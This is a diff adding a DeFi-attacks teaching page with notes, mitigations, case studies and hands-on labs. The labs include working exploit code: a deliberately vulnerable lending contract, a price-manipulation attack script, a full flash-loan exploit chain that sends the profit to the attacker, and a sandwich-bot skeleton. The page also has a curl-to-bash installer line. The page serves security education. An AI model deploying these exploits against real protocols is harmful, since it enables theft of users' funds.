@@ -1,0 +1,1605 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | DeFi Attacks</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-solidity.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>DeFi Attacks</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== DEFI BASICS ==================== -->
+        <h2>DeFi Protocol Basics</h2>
+
+        <h3>Automated Market Makers (AMMs)</h3>
+        <p>AMMs replace order books with liquidity pools. Constant product formula: <strong>x &times; y = k</strong>.</p>
+<pre><code class="language-solidity">// Simplified Uniswap-style AMM
+// Pool holds reserveA and reserveB tokens
+// Trade: send dx of token A, receive dy of token B
+// dy = (reserveB * dx) / (reserveA + dx)
+// Price impact increases with trade size relative to reserves</code></pre>
+        <table>
+          <tr><th>Protocol</th><th>Model</th><th>Key Feature</th></tr>
+          <tr><td>Uniswap</td><td>x*y=k</td><td>Simple, permissionless pools</td></tr>
+          <tr><td>Curve</td><td>StableSwap invariant</td><td>Low slippage for pegged assets</td></tr>
+          <tr><td>Balancer</td><td>Weighted pools</td><td>Multiple tokens with custom weights</td></tr>
+        </table>
+
+        <h3>Lending Protocols</h3>
+        <p>Deposit collateral, borrow other assets. If collateral value drops below threshold &rarr; liquidation.</p>
+        <table>
+          <tr><th>Protocol</th><th>Key Mechanism</th></tr>
+          <tr><td>Aave</td><td>Variable/stable rates, flash loans, aTokens</td></tr>
+          <tr><td>Compound</td><td>cTokens (interest-bearing), governance (COMP)</td></tr>
+          <tr><td>MakerDAO</td><td>CDPs (Collateralized Debt Positions), DAI stablecoin</td></tr>
+        </table>
+
+        <h3>Yield Farming</h3>
+        <p>Provide liquidity or stake tokens to earn rewards. Risk: impermanent loss, smart contract bugs, rug pulls.</p>
+
+        <!-- ==================== FLASH LOANS ==================== -->
+        <h2>Flash Loans</h2>
+        <p>Borrow any amount with <strong>zero collateral</strong> — must repay within the same transaction or everything reverts. Available on Aave, dYdX, Uniswap V2+ (flash swaps).</p>
+
+<pre><code class="language-solidity">// Aave V3 Flash Loan receiver
+import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
+
+contract MyFlashLoan is FlashLoanSimpleReceiverBase {
+    constructor(IPoolAddressesProvider provider)
+        FlashLoanSimpleReceiverBase(provider) {}
+
+    function executeOperation(
+        address asset,
+        uint256 amount,
+        uint256 premium,    // fee (usually 0.09%)
+        address initiator,
+        bytes calldata params
+    ) external override returns (bool) {
+        // --- YOUR LOGIC HERE ---
+        // You have `amount` of `asset` to use
+
+        // Approve repayment: amount + fee
+        uint256 amountOwed = amount + premium;
+        IERC20(asset).approve(address(POOL), amountOwed);
+        return true;
+    }
+
+    function requestFlashLoan(address token, uint256 amount) external {
+        POOL.flashLoanSimple(address(this), token, amount, "", 0);
+    }
+}</code></pre>
+
+        <!-- ==================== FLASH LOAN ATTACK METHODOLOGY ==================== -->
+        <h2>Flash Loan Attack Methodology</h2>
+        <ol>
+          <li><strong>Identify target:</strong> Protocol using on-chain spot prices (AMM reserves) as oracle</li>
+          <li><strong>Borrow:</strong> Take flash loan of large amount of token A</li>
+          <li><strong>Manipulate:</strong> Swap token A for token B on the AMM &rarr; skews reserves &rarr; price changes</li>
+          <li><strong>Exploit:</strong> Interact with target protocol that reads the now-manipulated price</li>
+          <li><strong>Profit:</strong> Extract value from the protocol at the wrong price</li>
+          <li><strong>Unwind:</strong> Swap back, repay flash loan + fee, pocket the difference</li>
+        </ol>
+<pre><code class="language-solidity">// Pseudocode: typical flash loan attack flow
+function attack() external {
+    // 1. Flash borrow 10,000 ETH
+    aave.flashLoan(10000 ether);
+}
+
+function executeOperation(...) external {
+    // 2. Dump 10,000 ETH into Uniswap ETH/TOKEN pool
+    //    → TOKEN price spikes relative to ETH
+    uniswap.swap(10000 ether → TOKEN);
+
+    // 3. Deposit TOKEN into vulnerable lending protocol
+    //    Protocol reads Uniswap price → thinks TOKEN is worth way more
+    //    → Allows borrowing far more ETH than TOKEN is actually worth
+    vulnerable.deposit(TOKEN);
+    vulnerable.borrow(MAX_ETH);
+
+    // 4. Swap TOKEN back to ETH on Uniswap (price normalizes)
+    uniswap.swap(TOKEN → ETH);
+
+    // 5. Repay flash loan, keep profit
+    repay(10000 ether + fee);
+    // Profit = borrowed ETH - flash loan fee
+}</code></pre>
+
+        <!-- ==================== PRICE ORACLE MANIPULATION ==================== -->
+        <h2>Price Oracle Manipulation</h2>
+<pre><code class="language-solidity">// VULNERABLE: reads spot price from AMM
+function getTokenPrice() public view returns (uint256) {
+    (uint112 reserve0, uint112 reserve1, ) = uniswapPair.getReserves();
+    return uint256(reserve1) * 1e18 / uint256(reserve0);
+    // Flash loan can temporarily skew reserves → wrong price
+}
+
+// SAFE: Use Chainlink oracle (off-chain, aggregated, tamper-resistant)
+function getTokenPrice() public view returns (uint256) {
+    (, int256 price, , uint256 updatedAt, ) = chainlinkFeed.latestRoundData();
+    require(block.timestamp - updatedAt < 3600, "Stale");
+    return uint256(price);
+}
+
+// SAFER: Use TWAP (Time-Weighted Average Price)
+// Averages price over multiple blocks → flash loan only affects 1 block
+// Uniswap V3 has built-in TWAP oracle via observe()</code></pre>
+
+        <!-- ==================== SANDWICH ATTACKS ==================== -->
+        <h2>Sandwich Attacks</h2>
+        <p>MEV bot monitors mempool for large pending DEX swaps:</p>
+        <ol>
+          <li><strong>Front-run:</strong> Buy the target token before victim's swap (pushes price up)</li>
+          <li><strong>Victim's swap:</strong> Executes at worse price due to increased slippage</li>
+          <li><strong>Back-run:</strong> Sell the token at the now-higher price</li>
+        </ol>
+<pre><code class="language-javascript">// Simplified MEV bot logic (ethers.js)
+const provider = new ethers.WebSocketProvider("wss://mainnet.infura.io/ws/v3/KEY");
+
+provider.on("pending", async (txHash) => {
+  const tx = await provider.getTransaction(txHash);
+  if (!tx || !tx.to) return;
+
+  // Check if it's a Uniswap swap
+  if (tx.to === UNISWAP_ROUTER && tx.data.startsWith("0x38ed1739")) {
+    const decoded = iface.decodeFunctionData("swapExactTokensForTokens", tx.data);
+    const amountIn = decoded.amountIn;
+
+    if (amountIn > ethers.parseEther("10")) {
+      // Large swap detected — sandwich it
+      // Front-run: buy same token with higher gas
+      // Back-run: sell after victim's tx confirms
+    }
+  }
+});</code></pre>
+        <p><strong>Prevention:</strong> Use private mempools (Flashbots Protect, MEV Blocker), set tight slippage tolerance, use limit orders.</p>
+
+        <!-- ==================== GOVERNANCE ATTACKS ==================== -->
+        <h2>Governance Attacks</h2>
+        <p>Flash loan governance tokens &rarr; vote on malicious proposal &rarr; return tokens. All in one transaction if the protocol allows same-block voting.</p>
+<pre><code class="language-solidity">// Attack flow:
+// 1. Flash borrow governance tokens
+// 2. Delegate voting power to self
+// 3. Create/vote on proposal to drain treasury
+// 4. If proposal executes instantly → treasury drained
+// 5. Return governance tokens
+
+// MITIGATION: Require tokens to be held for N blocks before voting
+// (Compound-style timelock + voting delay)</code></pre>
+
+        <!-- ==================== LIQUIDITY POOL ATTACKS ==================== -->
+        <h2>Liquidity Pool Attacks</h2>
+        <p><strong>LP token price manipulation:</strong> If a protocol values LP tokens based on the underlying reserves, an attacker can donate assets to the pool to inflate LP token value, use overvalued LP tokens as collateral, then borrow against them.</p>
+<pre><code class="language-solidity">// Vulnerable LP valuation
+function getLPValue(address pair) public view returns (uint256) {
+    (uint112 r0, uint112 r1, ) = IUniswapV2Pair(pair).getReserves();
+    uint256 totalSupply = IUniswapV2Pair(pair).totalSupply();
+    // Direct donation to pair contract inflates reserves without minting LP tokens
+    // → each LP token appears more valuable
+    return (r0 + r1) * 1e18 / totalSupply;
+}
+
+// FIX: Use fair LP pricing (Alpha Homora formula)
+// fair_price = 2 * sqrt(r0 * r1) * sqrt(p0 * p1) / totalSupply</code></pre>
+
+        <!-- ==================== RUG PULLS ==================== -->
+        <h2>Rug Pulls — How to Identify</h2>
+        <table>
+          <tr><th>Red Flag</th><th>What to Check</th></tr>
+          <tr><td>Unverified contract</td><td>Source not on Etherscan</td></tr>
+          <tr><td>Owner can mint unlimited tokens</td><td>Look for <code>mint()</code> without cap</td></tr>
+          <tr><td>Owner can pause transfers</td><td><code>_beforeTokenTransfer</code> with blacklist</td></tr>
+          <tr><td>Liquidity not locked</td><td>LP tokens held by deployer, no timelock</td></tr>
+          <tr><td>Hidden fees / tax</td><td>Transfer function takes % to owner</td></tr>
+          <tr><td>Honeypot</td><td>Can buy but sell always reverts</td></tr>
+          <tr><td>No audit</td><td>Unknown team, no code review</td></tr>
+        </table>
+<pre><code class="language-bash"># Quick checks
+# 1. Verify contract source on Etherscan
+# 2. Check if LP is locked (e.g., on Unicrypt/Team.finance)
+# 3. Run through Token Sniffer or GoPlus Security API
+# 4. Check holder distribution — top wallets shouldn't hold >10%
+# 5. Read the contract: search for mint, pause, blacklist, fee, setFee</code></pre>
+
+        <!-- ==================== MEV ==================== -->
+        <h2>MEV (Maximal Extractable Value)</h2>
+        <p>Profit available to block producers by reordering, inserting, or censoring transactions.</p>
+        <table>
+          <tr><th>MEV Type</th><th>Description</th></tr>
+          <tr><td>Arbitrage</td><td>Price differences between DEXes</td></tr>
+          <tr><td>Liquidations</td><td>Racing to liquidate undercollateralized positions</td></tr>
+          <tr><td>Sandwich</td><td>Front-run + back-run user swaps</td></tr>
+          <tr><td>JIT Liquidity</td><td>Provide concentrated liquidity just for one swap, withdraw after</td></tr>
+          <tr><td>Time-bandit</td><td>Re-org past blocks to capture MEV retroactively</td></tr>
+        </table>
+<pre><code class="language-bash"># Flashbots: private transaction pool to avoid front-running
+# Users submit bundles directly to block builders
+# No public mempool exposure
+
+# Flashbots Protect RPC (add to MetaMask):
+# https://rpc.flashbots.net
+
+# MEV tracking: https://explore.flashbots.net
+# See extracted MEV per block, top searchers, etc.</code></pre>
+
+        <!-- ==================== AUDIT CHECKLIST ==================== -->
+        <h2>DeFi Audit Checklist</h2>
+        <table>
+          <tr><th>Category</th><th>Check</th></tr>
+          <tr><td>Reentrancy</td><td>All external calls after state updates? ReentrancyGuard used?</td></tr>
+          <tr><td>Access Control</td><td>Admin functions protected? Role-based access?</td></tr>
+          <tr><td>Oracle</td><td>Using Chainlink/TWAP? Not spot price?</td></tr>
+          <tr><td>Flash Loan Resistance</td><td>Can key operations be exploited in single tx?</td></tr>
+          <tr><td>Integer Math</td><td>Solidity &ge;0.8? Rounding in correct direction?</td></tr>
+          <tr><td>Frontrunning</td><td>Commit-reveal? Deadline/slippage params?</td></tr>
+          <tr><td>Token Integration</td><td>Fee-on-transfer tokens handled? Return value checked?</td></tr>
+          <tr><td>Upgradability</td><td>Storage collision? Initializer protection?</td></tr>
+          <tr><td>Economic</td><td>Incentive-aligned? Pool manipulation possible?</td></tr>
+          <tr><td>DoS</td><td>Unbounded loops? Pull over push?</td></tr>
+        </table>
+
+        <!-- ==================== TOOLS ==================== -->
+        <h2>Security Analysis Tools</h2>
+        <table>
+          <tr><th>Tool</th><th>Type</th><th>Usage</th></tr>
+          <tr><td>Slither</td><td>Static analysis</td><td><code>slither . --detect reentrancy-eth</code></td></tr>
+          <tr><td>Mythril</td><td>Symbolic execution</td><td><code>myth analyze contracts/Vuln.sol</code></td></tr>
+          <tr><td>Echidna</td><td>Fuzzer (property-based)</td><td>Write invariant tests, fuzz inputs</td></tr>
+          <tr><td>Foundry (forge)</td><td>Testing framework</td><td><code>forge test --fuzz-runs 10000</code></td></tr>
+          <tr><td>4naly3er</td><td>Static analysis</td><td>Gas optimizations + common vulns</td></tr>
+          <tr><td>Aderyn</td><td>Static analysis (Rust)</td><td>Fast Solidity linter</td></tr>
+        </table>
+<pre><code class="language-bash"># Install Slither
+pip install slither-analyzer
+
+# Run on project
+slither .
+
+# Specific detectors
+slither . --detect reentrancy-eth,unprotected-upgrade,arbitrary-send-eth
+
+# Install Mythril
+pip install mythril
+
+# Analyze single file
+myth analyze contracts/Vault.sol --solv 0.8.20
+
+# Foundry (Forge) — fast Solidity testing
+curl -L https://foundry.paradigm.xyz | bash
+foundryup
+forge init my-project
+forge test -vvv</code></pre>
+
+        <!-- ==================== CASE STUDIES ==================== -->
+        <h2>Real-World Case Studies</h2>
+        <table>
+          <tr><th>Incident</th><th>Year</th><th>Loss</th><th>Root Cause</th></tr>
+          <tr><td>bZx</td><td>2020</td><td>$8M</td><td>Flash loan + oracle manipulation. Borrowed on one platform, manipulated price on Uniswap, profited on margin trade.</td></tr>
+          <tr><td>Cream Finance</td><td>2021</td><td>$130M</td><td>Flash loan to inflate LP token price used as collateral. Borrowed against overvalued collateral, drained pool.</td></tr>
+          <tr><td>Wormhole</td><td>2022</td><td>$320M</td><td>Signature verification bypass on Solana side of the bridge. Attacker minted unbacked wrapped ETH.</td></tr>
+          <tr><td>Nomad Bridge</td><td>2022</td><td>$190M</td><td>Initialization bug: upgrade set trusted root to 0x00, making every message provable. Copycat attackers piled on.</td></tr>
+        </table>
+
+        <h3>Common Patterns Across Exploits</h3>
+        <ul>
+          <li><strong>Oracle dependence:</strong> Spot price from AMM used as truth &rarr; flash-loan-manipulable</li>
+          <li><strong>Composability risk:</strong> Protocols interacting create emergent attack surfaces</li>
+          <li><strong>Bridge vulnerabilities:</strong> Cross-chain message verification is extremely hard to get right</li>
+          <li><strong>Upgrade bugs:</strong> Storage collision or unprotected initializers during upgrades</li>
+          <li><strong>Economic assumptions:</strong> Models break under extreme (flash-loan-sized) capital</li>
+        </ul>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+
+        <div class="lab-card">
+          <h4>Lab 1: Flash Loan Basics with Aave</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Execute a simple flash loan on a local fork of Ethereum mainnet using Aave V3. Borrow USDC, log the balance, and repay.</p>
+
+          <h5>Step 1: Setup Hardhat with Mainnet Fork</h5>
+<pre><code class="language-bash">npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox
+npm install @aave/v3-core @openzeppelin/contracts
+npx hardhat init</code></pre>
+<pre><code class="language-javascript">// hardhat.config.js
+module.exports = {
+  solidity: "0.8.20",
+  networks: {
+    hardhat: {
+      forking: {
+        url: "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY",
+        blockNumber: 18000000  // pin block for reproducibility
+      }
+    }
+  }
+};</code></pre>
+
+          <h5>Step 2: Flash Loan Contract</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
+import "@aave/v3-core/contracts/interfaces/IPoolAddressesProvider.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract SimpleFlashLoan is FlashLoanSimpleReceiverBase {
+    event FlashLoanExecuted(address token, uint256 amount, uint256 fee);
+
+    constructor(IPoolAddressesProvider provider)
+        FlashLoanSimpleReceiverBase(provider) {}
+
+    function executeOperation(
+        address asset,
+        uint256 amount,
+        uint256 premium,
+        address,
+        bytes calldata
+    ) external override returns (bool) {
+        // You now have `amount` of `asset`
+        uint256 balance = IERC20(asset).balanceOf(address(this));
+        emit FlashLoanExecuted(asset, balance, premium);
+
+        // Approve pool to pull back amount + fee
+        IERC20(asset).approve(address(POOL), amount + premium);
+        return true;
+    }
+
+    function requestFlashLoan(address token, uint256 amount) external {
+        POOL.flashLoanSimple(address(this), token, amount, "", 0);
+    }
+}</code></pre>
+
+          <h5>Step 3: Test</h5>
+<pre><code class="language-javascript">const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+const AAVE_POOL_PROVIDER = "0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e"; // mainnet
+const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+
+describe("Flash Loan", function () {
+  it("borrows and repays USDC", async () => {
+    const FlashLoan = await ethers.getContractFactory("SimpleFlashLoan");
+    const flashLoan = await FlashLoan.deploy(AAVE_POOL_PROVIDER);
+
+    // Fund contract with small USDC for the fee (0.09%)
+    // Use Hardhat's impersonation to get USDC from a whale
+    const whale = "0x55FE002aefF02F77364de339a1292923A15844B8";
+    await ethers.provider.send("hardhat_impersonateAccount", [whale]);
+    const whaleSigner = await ethers.getSigner(whale);
+
+    const usdc = await ethers.getContractAt("IERC20", USDC);
+    await usdc.connect(whaleSigner).transfer(
+      await flashLoan.getAddress(),
+      1000e6  // 1000 USDC for fee
+    );
+
+    // Execute flash loan for 1M USDC
+    const tx = await flashLoan.requestFlashLoan(USDC, 1_000_000e6);
+    const receipt = await tx.wait();
+
+    // Check event
+    const event = receipt.logs.find(l => l.fragment?.name === "FlashLoanExecuted");
+    console.log("Flash loan succeeded!");
+  });
+});</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Price Manipulation Attack</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Set up a vulnerable lending protocol that reads price from an AMM. Use a flash loan to manipulate the AMM price, borrow at the wrong price, and profit.</p>
+
+          <h5>Step 1: Simplified AMM + Vulnerable Lending Protocol</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract TokenA is ERC20 {
+    constructor() ERC20("TokenA", "TKA") {
+        _mint(msg.sender, 1_000_000 ether);
+    }
+}
+
+contract TokenB is ERC20 {
+    constructor() ERC20("TokenB", "TKB") {
+        _mint(msg.sender, 1_000_000 ether);
+    }
+}
+
+// Simple AMM with x*y=k
+contract SimpleAMM {
+    IERC20 public tokenA;
+    IERC20 public tokenB;
+    uint256 public reserveA;
+    uint256 public reserveB;
+
+    constructor(address _a, address _b) {
+        tokenA = IERC20(_a);
+        tokenB = IERC20(_b);
+    }
+
+    function addLiquidity(uint256 amountA, uint256 amountB) external {
+        tokenA.transferFrom(msg.sender, address(this), amountA);
+        tokenB.transferFrom(msg.sender, address(this), amountB);
+        reserveA += amountA;
+        reserveB += amountB;
+    }
+
+    function swap(address tokenIn, uint256 amountIn) external returns (uint256) {
+        bool isA = tokenIn == address(tokenA);
+        (IERC20 tIn, IERC20 tOut, uint256 rIn, uint256 rOut) = isA
+            ? (tokenA, tokenB, reserveA, reserveB)
+            : (tokenB, tokenA, reserveB, reserveA);
+
+        tIn.transferFrom(msg.sender, address(this), amountIn);
+        uint256 amountOut = (rOut * amountIn) / (rIn + amountIn);
+        tOut.transfer(msg.sender, amountOut);
+
+        if (isA) { reserveA += amountIn; reserveB -= amountOut; }
+        else     { reserveB += amountIn; reserveA -= amountOut; }
+
+        return amountOut;
+    }
+
+    function getPrice() external view returns (uint256) {
+        return reserveB * 1e18 / reserveA;  // price of A in terms of B
+    }
+}
+
+// Vulnerable: uses AMM spot price as oracle
+contract VulnerableLender {
+    SimpleAMM public amm;
+    IERC20 public tokenA;
+    IERC20 public tokenB;
+    mapping(address => uint256) public collateral;
+
+    constructor(address _amm, address _a, address _b) {
+        amm = SimpleAMM(_amm);
+        tokenA = IERC20(_a);
+        tokenB = IERC20(_b);
+    }
+
+    function depositCollateral(uint256 amount) external {
+        tokenA.transferFrom(msg.sender, address(this), amount);
+        collateral[msg.sender] += amount;
+    }
+
+    function borrow(uint256 amount) external {
+        uint256 price = amm.getPrice();  // VULNERABLE: spot price
+        uint256 collateralValue = collateral[msg.sender] * price / 1e18;
+        require(collateralValue >= amount, "Undercollateralized");
+        tokenB.transfer(msg.sender, amount);
+    }
+}</code></pre>
+
+          <h5>Step 2: Attack Script</h5>
+<pre><code class="language-javascript">describe("Price Manipulation", function () {
+  it("manipulates AMM price to overborrow", async () => {
+    const [deployer, attacker] = await ethers.getSigners();
+
+    // Deploy tokens
+    const A = await (await ethers.getContractFactory("TokenA")).deploy();
+    const B = await (await ethers.getContractFactory("TokenB")).deploy();
+
+    // Deploy AMM with 1:1 price (100k each)
+    const AMM = await (await ethers.getContractFactory("SimpleAMM")).deploy(
+      await A.getAddress(), await B.getAddress()
+    );
+    await A.approve(await AMM.getAddress(), ethers.parseEther("100000"));
+    await B.approve(await AMM.getAddress(), ethers.parseEther("100000"));
+    await AMM.addLiquidity(ethers.parseEther("100000"), ethers.parseEther("100000"));
+
+    // Deploy lender with 50k tokenB to lend
+    const Lender = await (await ethers.getContractFactory("VulnerableLender")).deploy(
+      await AMM.getAddress(), await A.getAddress(), await B.getAddress()
+    );
+    await B.transfer(await Lender.getAddress(), ethers.parseEther("50000"));
+
+    // Give attacker some tokenA
+    await A.transfer(attacker.address, ethers.parseEther("10000"));
+
+    // --- ATTACK ---
+    // 1. Deposit small collateral (100 tokenA)
+    await A.connect(attacker).approve(await Lender.getAddress(), ethers.parseEther("100"));
+    await Lender.connect(attacker).depositCollateral(ethers.parseEther("100"));
+
+    // 2. Manipulate price: dump tokenB into AMM → price of A skyrockets
+    await A.connect(attacker).approve(await AMM.getAddress(), ethers.parseEther("9000"));
+    // Actually: buy B with A first to get B, then dump B to inflate A price
+    // Simpler: just swap large amount of A to get lots of B
+    // This changes the ratio making A appear more expensive
+
+    // Swap to manipulate: dump lots of A → reserveA goes up → A appears cheap
+    // We need A to appear EXPENSIVE. So dump B instead.
+    // Give attacker some B to dump
+    await B.transfer(attacker.address, ethers.parseEther("50000"));
+    await B.connect(attacker).approve(await AMM.getAddress(), ethers.parseEther("50000"));
+    await AMM.connect(attacker).swap(await B.getAddress(), ethers.parseEther("50000"));
+
+    // Price of A is now inflated (reserveB went up, reserveA went down)
+    const newPrice = await AMM.getPrice();
+    console.log("Manipulated price:", ethers.formatEther(newPrice));
+
+    // 3. Borrow max tokenB from lender at inflated collateral value
+    await Lender.connect(attacker).borrow(ethers.parseEther("40000"));
+
+    const stolen = await B.balanceOf(attacker.address);
+    console.log("Attacker tokenB balance:", ethers.formatEther(stolen));
+  });
+});</code></pre>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Full Flash Loan Exploit Chain</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Combine a flash loan with price oracle manipulation and reentrancy in a single transaction. Borrow from a flash loan provider, manipulate an AMM price, exploit a vulnerable lending protocol, and repay — all atomically.</p>
+
+          <h5>Attack Contract</h5>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface IFlashLender {
+    function flashLoan(address receiver, uint256 amount) external;
+}
+
+interface ISimpleAMM {
+    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
+    function getPrice() external view returns (uint256);
+}
+
+interface IVulnerableLender {
+    function depositCollateral(uint256 amount) external;
+    function borrow(uint256 amount) external;
+}
+
+contract FullExploitChain {
+    IFlashLender public flashLender;
+    ISimpleAMM public amm;
+    IVulnerableLender public lender;
+    IERC20 public tokenA;
+    IERC20 public tokenB;
+    address public attacker;
+
+    constructor(
+        address _flashLender,
+        address _amm,
+        address _lender,
+        address _tokenA,
+        address _tokenB
+    ) {
+        flashLender = IFlashLender(_flashLender);
+        amm = ISimpleAMM(_amm);
+        lender = IVulnerableLender(_lender);
+        tokenA = IERC20(_tokenA);
+        tokenB = IERC20(_tokenB);
+        attacker = msg.sender;
+    }
+
+    function attack() external {
+        // Step 1: Flash borrow large amount of tokenB
+        flashLender.flashLoan(address(this), 100_000 ether);
+    }
+
+    // Called by flash lender
+    function onFlashLoan(uint256 amount) external {
+        // Step 2: Dump tokenB into AMM → inflate tokenA price
+        tokenB.approve(address(amm), amount);
+        amm.swap(address(tokenB), amount);
+
+        // Step 3: Deposit small tokenA collateral into lender
+        uint256 collateral = tokenA.balanceOf(address(this));
+        tokenA.approve(address(lender), collateral);
+        lender.depositCollateral(collateral);
+
+        // Step 4: Borrow at inflated price
+        lender.borrow(50_000 ether);
+
+        // Step 5: Swap tokenA back for tokenB to repay
+        uint256 tokenABal = tokenA.balanceOf(address(this));
+        if (tokenABal > 0) {
+            tokenA.approve(address(amm), tokenABal);
+            amm.swap(address(tokenA), tokenABal);
+        }
+
+        // Step 6: Repay flash loan
+        uint256 repayAmount = amount + (amount / 1000); // 0.1% fee
+        tokenB.transfer(address(flashLender), repayAmount);
+
+        // Step 7: Send profit to attacker
+        tokenB.transfer(attacker, tokenB.balanceOf(address(this)));
+    }
+}</code></pre>
+          <p>Key insight: The entire attack happens in a single transaction. If any step fails, everything reverts — zero risk for the attacker (except gas costs).</p>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Uniswap V2 Interaction</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Interact with Uniswap V2 on a mainnet fork — add liquidity, perform swaps, and read pool reserves programmatically.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">const { ethers } = require("hardhat");
+
+const UNISWAP_ROUTER = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
+const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
+const DAI = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
+
+async function main() {
+    const [signer] = await ethers.getSigners();
+    const router = await ethers.getContractAt("IUniswapV2Router02", UNISWAP_ROUTER);
+
+    // Swap ETH for DAI
+    const amountIn = ethers.parseEther("1");
+    const deadline = Math.floor(Date.now() / 1000) + 600;
+
+    const tx = await router.swapExactETHForTokens(
+        0,  // min amount out (0 for testing, NEVER in production)
+        [WETH, DAI],
+        signer.address,
+        deadline,
+        { value: amountIn }
+    );
+    await tx.wait();
+
+    const dai = await ethers.getContractAt("IERC20", DAI);
+    console.log("DAI balance:", ethers.formatEther(await dai.balanceOf(signer.address)));
+
+    // Read pool reserves
+    const FACTORY = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f";
+    const factory = await ethers.getContractAt("IUniswapV2Factory", FACTORY);
+    const pairAddr = await factory.getPair(WETH, DAI);
+    const pair = await ethers.getContractAt("IUniswapV2Pair", pairAddr);
+    const [r0, r1] = await pair.getReserves();
+    console.log("Reserves:", ethers.formatEther(r0), ethers.formatEther(r1));
+}
+
+main();</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run on a Hardhat mainnet fork and perform a swap</li>
+              <li>Calculate the expected output using the constant product formula</li>
+              <li>Compare the actual vs expected output — the difference is the trading fee (0.3%)</li>
+              <li>Add liquidity to a pool and observe LP token minting</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Price Feed Analysis</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Compare spot prices from Uniswap vs Chainlink price feeds. Demonstrate why spot prices are manipulable.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">const CHAINLINK_ETH_USD = "0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419";
+const UNISWAP_ETH_USDC_PAIR = "0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc";
+
+async function comparePrices() {
+    // Chainlink price
+    const feed = await ethers.getContractAt("AggregatorV3Interface", CHAINLINK_ETH_USD);
+    const [, price, , updatedAt] = await feed.latestRoundData();
+    const chainlinkPrice = Number(price) / 1e8;
+    const staleness = Math.floor(Date.now()/1000) - Number(updatedAt);
+
+    // Uniswap spot price
+    const pair = await ethers.getContractAt("IUniswapV2Pair", UNISWAP_ETH_USDC_PAIR);
+    const [r0, r1] = await pair.getReserves();
+    const uniPrice = Number(r0) / Number(r1) * 1e12;  // adjust decimals
+
+    console.log(`Chainlink ETH/USD: $${chainlinkPrice} (${staleness}s old)`);
+    console.log(`Uniswap spot:      $${uniPrice}`);
+    console.log(`Difference:        ${((uniPrice/chainlinkPrice - 1) * 100).toFixed(3)}%`);
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run on mainnet fork and compare the two prices</li>
+              <li>Perform a large swap on the fork and observe how the Uniswap price changes but Chainlink stays the same</li>
+              <li>Why is this price difference exploitable?</li>
